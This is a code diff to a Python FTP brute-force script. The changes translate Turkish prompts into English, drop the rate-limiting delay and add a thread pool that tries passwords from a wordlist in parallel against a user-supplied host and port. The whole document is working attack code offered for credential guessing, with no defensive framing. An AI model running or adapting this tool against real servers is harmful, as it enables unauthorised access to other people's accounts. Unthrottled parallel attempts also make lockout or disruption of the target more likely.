@@ -1,6 +1,6 @@
 import ftplib
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import os
-import time
 
 os.system("clear")
 
@@ -12,14 +12,12 @@ print(r"""
 
 """)
 
-# Target IP al
-target = input("📍 Target IP: ")
+target = input("📍 Target IP or Hostname: ")
 
-# 2 veya 4 haneli port iste
 while True:
-    port_input = input("📡 Target Port (2 veya 4 haneli, örn: 21 veya 2121): ")
+    port_input = input("📡 Target Port (2 or 4 digits, e.g. 21 or 2121): ")
     if not port_input.isdigit():
-        print("❌ Lütfen sadece sayı gir.")
+        print("❌ Please enter only numbers.")
         continue
     length = len(port_input)
     port = int(port_input)
@@ -28,46 +26,53 @@ while True:
     elif length == 4 and 1000 <= port <= 9999:
         break
     else:
-        print("❌ Port 2 haneli (1-99) veya 4 haneli (1000-9999) olmalı.")
+        print("❌ Port must be 2 digits (1-99) or 4 digits (1000-9999).")
 
-# Kullanıcı adı al, boşsa anonymous
 username = input("👤 FTP Username (leave blank for anonymous): ")
 if username.strip() == "":
     username = "anonymous"
 
-# Parola listesi tercihi
 choice = input("📂 Use ready-made passlist.txt? (y/n): ").lower()
-
 if choice == "y":
     passlist_path = "passlist.txt"
 else:
-    passlist_path = input("📁 Type your password list path: ")
+    passlist_path = input("📁 Enter your password list path: ")
 
-# Parola listesini yükle
 try:
-    with open(passlist_path, "r", encoding="utf-8", errors="ignore") as file:
-        passwords = file.read().splitlines()
+    with open(passlist_path, "r", encoding="utf-8", errors="ignore") as f:
+        passwords = f.read().splitlines()
 except FileNotFoundError:
     print(f"❌ Password list not found at '{passlist_path}'")
     exit()
 
-print(f"\n🚀 Starting FTP brute-force on {target}:{port} as {username} with {len(passwords)} passwords...\n")
+print(f"\n🚀 Starting parallel FTP brute-force on {target}:{port} as {username} with {len(passwords)} passwords...\n")
 
-# Parola deneme döngüsü
-for password in passwords:
+found = False
+
+def try_password(pw):
+    global found
+    if found:
+        return None
     try:
         ftp = ftplib.FTP()
         ftp.connect(target, port, timeout=5)
-        ftp.login(user=username, passwd=password)
-        print(f"\n✅ Success! Username: {username} | Password: {password}")
+        ftp.login(user=username, passwd=pw)
         ftp.quit()
-        break
+        found = True
+        return pw
     except ftplib.error_perm:
-        print(f"🔍 Trying password: {password:<30} ❌ Incorrect")
+        return None
     except Exception as e:
-        print(f"⚠️ Error: {e}")
-        break
-    time.sleep(0.1)
+        return None
 
-else:
-    print("\n❌ Password not found in list.")
+max_workers = 10  # Aynı anda kaç paralel deneme yapılacağını buradan ayarla
+
+with ThreadPoolExecutor(max_workers=max_workers) as executor:
+    futures = {executor.submit(try_password, pw): pw for pw in passwords}
+    for future in as_completed(futures):
+        result = future.result()
+        if result:
+            print(f"\n✅ Success! Username: {username} | Password: {result}")
+            break
+    else:
+        print("\n❌ Password not found in list.")
